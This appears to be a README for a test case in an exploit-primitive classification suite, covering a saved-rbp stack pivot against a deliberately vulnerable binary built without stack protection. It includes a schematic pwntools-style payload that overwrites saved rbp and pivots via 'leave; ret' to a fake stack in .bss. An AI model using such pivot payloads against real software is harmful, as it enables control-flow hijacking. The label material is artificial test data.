# saved-rbp-stack-pivot

## Build

```bash
gcc -fno-stack-protector -no-pie -o vuln vuln.c
```

## Expected trigger signals

- saved rbp overwrite
- function epilogue `leave; ret`
- writable fake stack in `.bss`

## Expected primitive

- `pwn.primitive.saved_rbp_stack_pivot`

## Minimal probe shape

```text
fake_stack = p64(next_rbp) + p64(next_rip) + chain
payload = b"A"*off_rbp + p64(fake_stack_addr) + p64(leave_ret)
```

## Anti-pattern to avoid

Do not treat saved rbp only as a pivot if an original callsite can use it as an argument selector.
